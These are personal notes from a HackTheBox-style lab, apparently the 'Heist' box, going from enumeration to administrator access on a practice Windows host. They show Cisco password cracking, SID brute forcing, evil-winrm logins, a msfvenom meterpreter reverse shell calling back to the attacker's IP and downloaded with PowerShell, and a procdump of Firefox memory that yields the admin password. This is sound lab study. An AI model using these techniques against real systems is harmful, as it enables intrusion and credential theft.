IPv4: 10.129.96.157

## Enumeration/Scanning

- sudo nmap -sV -sC -Pn 10.129.96.157 -p-
    
    Starting Nmap 7.93 ( [https://nmap.org](https://nmap.org/) ) at 2023-08-07 18:32 EDT
    Nmap scan report for 10.129.96.157
    Host is up (0.040s latency).
    Not shown: 65530 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |*http-server-header: Microsoft-IIS/10.0
    | http-cookie-flags:
    |   /:
    |     PHPSESSID:
    |*      httponly flag not set
    | http-methods:
    |_  Potentially risky methods: TRACE
    | http-title: Support Login Page
    |_Requested resource was login.php
    135/tcp   open  msrpc         Microsoft Windows RPC
    445/tcp   open  microsoft-ds?
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49669/tcp open  msrpc         Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb2-security-mode:
    |   311:
    |_    Message signing enabled but not required
    | smb2-time:
    |   date: 2023-08-07T22:35:25
    |_  start_date: N/A
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 210.38 seconds
    

Maybe vuln to evilwinrm

- SMB
    
    smbclient -N -L //10.129.96.157
    
    smbmap -H 10.129.96.157
    
    Unable to access SMB shares anonymously
    
- RPC
    
    rpcclient -U’%’ 10.129.96.157
    
    Unable to access rpc
    

- sudo gobuster dir -u [http://10.129.96.157](http://10.129.96.157/) -w /usr/share/wordlists/dirb/common.txt
    
    /attachments          (Status: 301) [Size: 156] [--> http://10.129.96.157/attachments/]
    /css                  (Status: 301) [Size: 148] [--> http://10.129.96.157/css/]
    /Images               (Status: 301) [Size: 151] [--> http://10.129.96.157/Images/]
    /images               (Status: 301) [Size: 151] [--> http://10.129.96.157/images/]
    /index.php            (Status: 302) [Size: 0] [--> login.php]
    /js                   (Status: 301) [Size: 147] [--> http://10.129.96.157/js/]
    

- sudo gobuster dir -u [http://10.129.96.157](http://10.129.96.157/) -w /usr/share/wordlists/dirb/common.txt -x .php
    
    /attachments          (Status: 301) [Size: 156] [--> http://10.129.96.157/attachments/]
    /css                  (Status: 301) [Size: 148] [--> http://10.129.96.157/css/]
    /errorpage.php        (Status: 200) [Size: 1240]
    /images               (Status: 301) [Size: 151] [--> http://10.129.96.157/images/]
    /Images               (Status: 301) [Size: 151] [--> http://10.129.96.157/Images/]
    /index.php            (Status: 302) [Size: 0] [--> login.php]
    /Index.php            (Status: 302) [Size: 0] [--> login.php]
    /index.php            (Status: 302) [Size: 0] [--> login.php]
    /issues.php           (Status: 302) [Size: 16] [--> login.php]
    /js                   (Status: 301) [Size: 147] [--> http://10.129.96.157/js/]
    /login.php            (Status: 200) [Size: 2058]
    /Login.php            (Status: 200) [Size: 2058]
    

sqlmap -r Downloads/sql.req --batch

sqlmap found nothing

trying guest login

Users found:

**Hazard**

- config.txt
    
     seems to have some useful information. Maybe able to access the host with found credentials
    
    Cisco Router `version 12.2`
    
    enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
    
    username rout3r password 7 0242114B0E143F015F5D1E161713
    username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
    
    “Thanks a lot. Also, please create an account for me on the windows server as I need to access the files.”
    
    Hazard may have a user account I can login to.
    

The config file has some passwords I can crack. 

I identified the types of hashes using https://hashes.com/en/tools/hash_identifier

They are cisco ios passwords. I found this script https://github.com/theevilbit/ciscot7/blob/master/ciscot7.py

Which I ran with the config.txt file to crack the passwords.

python3 [ciscot7.py](http://ciscot7.py/) -f config.txt

$uperP@ssword

Q4)sJu\Y8qz*A3?d

It did not crack the first hash, so I have to use a more advanced tool.

When looking up ways to crack cisco ios md5 hashes I found this: https://www.soldierx.com/tutorials/Using-John-Crack-Cisco-md5

echo 'enable_secret:$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash.txt

john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

stealth1agent

Now that the passwords are cracked, I can try to access to host.

- smbmap -H 10.129.96.157 -u hazard -p 'stealth1agent’
    
    Disk                                                  	Permissions	Comment
    ----                                                  	-----------	-------
    ADMIN$                                            	NO ACCESS	Remote Admin
    C$                                                	NO ACCESS	Default share
    IPC$                                              	READ ONLY	Remote IPC
    

- rpcclient 10.129.96.157 -U hazard
    
    stealth1agent
    
    Unable to access much or find other users.
    

Since rpcclient brought no luck I’m going to try to use evilwinrm

ruby evil-winrm.rb -i 10.129.96.157 -u hazard -p 'stealth1agent’

Authorization error. None of the passwords work for hazard. 

Need to enumerate and find additional users

https://academy.hackthebox.com/module/143/section/1517

mentions a tool for bruteforcing SID’s with lookupsid.py

- sudo impacket-lookupsid hazard:stealth1agent@10.129.96.157
    
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    
    [*] Brute forcing SIDs at 10.129.96.157
    [*] StringBinding ncacn_np:10.129.96.157[\pipe\lsarpc]
    [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
    500: SUPPORTDESK\Administrator (SidTypeUser)
    501: SUPPORTDESK\Guest (SidTypeUser)
    503: SUPPORTDESK\DefaultAccount (SidTypeUser)
    504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
    513: SUPPORTDESK\None (SidTypeGroup)
    1008: SUPPORTDESK\Hazard (SidTypeUser)
    1009: SUPPORTDESK\support (SidTypeUser)
    1012: SUPPORTDESK\Chase (SidTypeUser)
    1013: SUPPORTDESK\Jason (SidTypeUser)
    

I was able to connect with Chase and evil-winrm

## Exploitation

ruby evil-winrm.rb -i 10.129.96.157 -u chase -p 'Q4)sJu\Y8qz*A3?d’

Remember: tree /A /F . 

user flag found

## Privilege Escalation

- todo.txt
    
    Stuff to-do:
    
    1. Keep checking the issues list.
    2. Fix the router config.
    
    Done:
    
    1. Restricted access for guest user.

First of all I want a better shell so I’m going to use msfconsole.

msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.16.173 LPORT=1127 -f exe -o shell.exe

impacket-smbserver -smb2support Share .

wget \\10.10.16.173\Share\shell.exe

exploit/multi/handler listening

I was unable to curl or wget the exe. “This program cannot be run in DOS mode”

Looked up and found a way through powershell 

https://juggernaut-sec.com/windows-file-transfers-for-hackers/

python3 -m http.server 80

IWR -Uri http://10.10.16.173/shell.exe -OutFile shell.exe

shell gained on msfconsole

running suggester on the session

None of the suggester exploits worked….

Checking Program Files for anything

I noticed Firefox is installed. I recall from genesis that there is a way to pull passwords from here using laZagne.py

.\LaZagne.exe all

It didnt work :((((((((((((((((((((((( 😢

I got stuck here so I looked at a write up 😟

https://sevenlayers.com/index.php/272-hackthebox-heist-walkthrough

0xdf was also helpful here

https://0xdf.gitlab.io/2019/11/30/htb-heist.html

A tool called procdump can be used to dump the process running firefox, download it to our machine, and then run strings on it to find the admins password.

https://live.sysinternals.com/procdump64.exe

run it on one of the pid for firefox

- get-process firefox
    
    Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
    
    ---
    
    1083      71   152076     230824       7.17   6292   1 firefox
    
    347      19    10248      35480       0.09   6404   1 firefox
    
    401      34    34240      93408       1.25   6592   1 firefox
    
    378      28    22412      59204       0.42   6784   1 firefox
    
    355      25    16400      38884       0.16   7044   1 firefox
    

**.**\procdump64 -ma 6252 -accepteula

I then searched the dump file for password and found

admin 4dD!5}x/re8]FBuZ

ruby evil-winrm.rb -i 10.129.96.157 -u administrator -p '4dD!5}x/re8]FBuZ’

rooted

## Post-exploitation

None
